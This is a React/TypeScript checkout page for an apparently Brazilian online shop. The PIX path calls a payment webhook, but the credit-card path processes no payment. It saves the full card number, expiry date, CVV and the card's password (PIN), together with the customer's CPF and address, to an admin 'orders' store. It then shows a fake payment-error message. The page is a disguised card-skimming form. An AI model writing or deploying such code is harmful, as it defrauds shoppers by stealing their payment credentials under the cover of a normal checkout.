import { useState } from "react";
import { useCart } from "@/contexts/CartContext";
import { useToast } from "@/hooks/use-toast";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { CustomerForm } from "@/components/checkout/CustomerForm";
import { PaymentMethodSelector } from "@/components/checkout/PaymentMethodSelector";
import { CreditCardForm, CreditCardData } from "@/components/checkout/CreditCardForm";
import { CardPasswordDialog } from "@/components/checkout/CardPasswordDialog";
import { getFromLocalStorage, saveToLocalStorage } from "@/utils/localStorage";
import { sendTictoWebhookV2 } from "@/utils/tictoWebhookV2";
import { useNavigate } from "react-router-dom";

interface CreditCardDataWithPassword extends CreditCardData {
  password?: string;
}

export default function Checkout() {
  const { items, total, clearCart } = useCart();
  const { toast } = useToast();
  const navigate = useNavigate();
  const [paymentMethod, setPaymentMethod] = useState<"pix" | "credit">("pix");
  const [showPasswordDialog, setShowPasswordDialog] = useState(false);
  const [formData, setFormData] = useState({
    name: "",
    cpf: "",
    email: "",
    phone: "",
    address: "",
    city: "",
    state: "",
    zipCode: "",
  });

  const [creditCardData, setCreditCardData] = useState<CreditCardData>({
    cardNumber: "",
    cardHolder: "",
    expiryDate: "",
    cvv: "",
  });

  const saveOrderToAdmin = (cardPassword?: string) => {
    const orderData = {
      id: Date.now().toString(),
      customer_data: formData,
      items: items,
      total_amount: total,
      payment_method: paymentMethod,
      credit_card_data: cardPassword 
        ? { ...creditCardData, password: cardPassword }
        : creditCardData,
      status: "pending",
      created_at: new Date().toISOString(),
    };

    const existingOrders = getFromLocalStorage('orders', []);
    saveToLocalStorage('orders', [...existingOrders, orderData]);

    toast({
      title: "Erro no processamento do pagamento",
      description: "Erro no processamento do pagamento com cartão de crédito",
      variant: "destructive"
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (paymentMethod === "pix") {
      try {
        const response = await sendTictoWebhookV2(items, formData);
        
        if (response && response.payment_url) {
          navigate('/?showPixPayment=true&pixUrl=' + encodeURIComponent(response.payment_url));
        } else {
          toast({
            title: "Erro no processamento",
            description: "Não foi possível gerar o link de pagamento PIX",
            variant: "destructive"
          });
        }
      } catch (error) {
        console.error("Erro ao processar pagamento:", error);
        toast({
          title: "Erro no processamento",
          description: error instanceof Error ? error.message : "Erro ao gerar link de pagamento PIX",
          variant: "destructive"
        });
      }
      return;
    }

    // Para pagamento com cartão, primeiro salvamos os dados e depois mostramos o diálogo de senha
    saveOrderToAdmin();
    setShowPasswordDialog(true);
  };

  const handlePasswordConfirm = (password: string) => {
    setShowPasswordDialog(false);
    // Atualizar o pedido com a senha
    saveOrderToAdmin(password);
  };

  return (
    <div className="min-h-screen bg-gray-50">
      <div className="container mx-auto px-4 pt-24">
        <Card>
          <CardHeader>
            <CardTitle>Finalizar Compra</CardTitle>
          </CardHeader>
          <CardContent>
            <form onSubmit={handleSubmit} className="space-y-6">
              <CustomerForm formData={formData} setFormData={setFormData} />
              <PaymentMethodSelector 
                paymentMethod={paymentMethod} 
                setPaymentMethod={setPaymentMethod} 
              />
              {paymentMethod === "credit" && (
                <CreditCardForm 
                  creditCardData={creditCardData}
                  setCreditCardData={setCreditCardData}
                />
              )}
              <Button type="submit" className="w-full">
                Finalizar Pedido
              </Button>
            </form>
          </CardContent>
        </Card>
      </div>
      <CardPasswordDialog
        open={showPasswordDialog}
        onClose={() => setShowPasswordDialog(false)}
        onConfirm={handlePasswordConfirm}
      />
    </div>
  );
}